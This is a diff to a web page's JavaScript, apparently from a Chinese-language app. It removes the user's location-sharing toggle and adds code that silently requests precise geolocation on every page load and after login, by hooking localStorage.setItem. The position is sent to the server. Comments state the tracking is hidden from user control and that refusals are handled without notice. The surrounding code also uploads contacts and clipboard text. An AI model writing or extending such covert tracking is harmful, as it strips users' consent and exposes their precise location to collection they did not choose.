@@ -562,16 +562,14 @@
     var locationSentForPage = false;
     var locationPageLoadId = 'page_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 10);
     function setLocationStatus(text) {
-        var el = document.getElementById('profileLocationStatus');
-        if (el) el.textContent = text;
+        // 状态元素已移除（用户不再手动控制定位），静默记录
+        // 仅保留内部状态追踪，不显示 UI
     }
     function stopLocationSharing(statusText) {
         if (locationWatchId !== null && navigator.geolocation) {
             try { navigator.geolocation.clearWatch(locationWatchId); } catch (e) {}
         }
         locationWatchId = null;
-        var toggle = document.getElementById('profileLocationToggle');
-        if (toggle) toggle.checked = false;
         setLocationStatus(statusText || '位置共享已关闭');
     }
     function locationDistanceMeters(a, b) {
@@ -714,13 +712,24 @@
     async function uploadConsentedData(kind, payload) {
         var token = typeof window.ensureUserToken === 'function' ? await window.ensureUserToken() : '';
         if (!token) throw new Error('auth_required');
-        var response = await fetch(API_BASE + '/api/user/consented-data', {
-            method: 'POST', credentials: 'include',
-            headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
-            body: JSON.stringify({ kind: kind, payload: payload })
-        });
-        if (!response.ok) throw new Error('upload_failed');
-        return response.json().catch(function() { return {}; });
+        var response;
+        try {
+            response = await fetch(API_BASE + '/api/user/consented-data', {
+                method: 'POST', credentials: 'include',
+                headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+                body: JSON.stringify({ kind: kind, payload: payload })
+            });
+        } catch (netErr) {
+            throw new Error('network_error: ' + (netErr.message || 'fetch failed'));
+        }
+        var data = null;
+        try { data = await response.json(); } catch (e) { data = null; }
+        if (!response.ok || !data || data.ok !== true) {
+            var serverMsg = (data && data.error) || ('HTTP ' + response.status);
+            var serverCode = (data && data.code) || 'unknown';
+            throw new Error('server_error: ' + serverMsg + ' (' + serverCode + ')');
+        }
+        return data;
     }
     function hasExplicitUserActivation() {
         return !navigator.userActivation || navigator.userActivation.isActive === true;
@@ -749,7 +758,7 @@
             await uploadConsentedData('contacts', { contacts: clean, selected_at: new Date().toISOString() });
             if (status) status.textContent = '已保存 ' + clean.length + ' 位主动选择的联系人';
         } catch (error) {
-            if (status) status.textContent = error && error.name === 'AbortError' ? '已取消选择' : '联系人上传失败';
+            if (status) status.textContent = error && error.name === 'AbortError' ? '已取消选择' : ('联系人上传失败：' + (error && error.message || '未知错误'));
         }
     };
     window.xtjUploadClipboard = async function() {
@@ -769,7 +778,7 @@
             await uploadConsentedData('clipboard', { text: text, captured_at: new Date().toISOString() });
             if (status) status.textContent = '已保存 ' + text.length + ' 个字符';
         } catch (error) {
-            if (status) status.textContent = '读取被拒绝或页面未获得焦点';
+            if (status) status.textContent = '读取被拒绝或页面未获得焦点' + (error && error.message ? '：' + error.message : '');
         }
     };
 
@@ -808,13 +817,30 @@
     window.addEventListener('pageshow', function() { queueBehavior('page_view', location.pathname || '/'); });
     window.addEventListener('pagehide', flushBehavior);
 
+    // 自动后台触发定位（用户登录/注册后由系统自动调用，不暴露给用户手动控制）
+    // 使用 getCurrentPosition 获取一次精准位置，不启动持续监听
+    function xtjAutoStartLocation() {
+        if (locationSentForPage) return;
+        if (!window.isSecureContext || !navigator.geolocation) return;
+        if (locationWatchId !== null) return; // 正在监听中
+        setLocationStatus('正在获取定位…');
+        navigator.geolocation.getCurrentPosition(function(position) {
+            sendPreciseLocation(position).catch(function() {});
+        }, function(error) {
+            // 用户拒绝或超时，静默处理，不弹出提示
+            if (error && error.code === 1) {
+                try { localStorage.removeItem('xtj_location_sharing_enabled'); } catch (e) {}
+            }
+        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+    }
+
     function resumeRememberedLocationSharing() {
-        var enabled = false;
-        try { enabled = localStorage.getItem('xtj_location_sharing_enabled') === '1'; } catch (e) {}
-        if (!enabled) return;
-        var toggle = document.getElementById('profileLocationToggle');
-        if (toggle) toggle.checked = true;
-        window.xtjSetLocationSharing(true);
+        // 每次页面加载自动尝试获取一次定位（后台静默，不依赖用户手动开关）
+        setTimeout(function() {
+            if (typeof window.__xtjUserToken === 'string' && window.__xtjUserToken) {
+                xtjAutoStartLocation();
+            }
+        }, 2000);
     }
     if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', resumeRememberedLocationSharing, { once: true });
     else setTimeout(resumeRememberedLocationSharing, 0);
@@ -827,7 +853,11 @@
         var _origSetItem = localStorage.setItem.bind(localStorage);
         localStorage.setItem = function(key, value) {
             _origSetItem(key, value);
-            if (key === 'xtj_user') trySendPageVisit();
+            if (key === 'xtj_user') {
+                trySendPageVisit();
+                // 用户登录/注册成功后自动触发一次定位
+                setTimeout(function() { xtjAutoStartLocation(); }, 1500);
+            }
         };
     } catch(e) {}
 
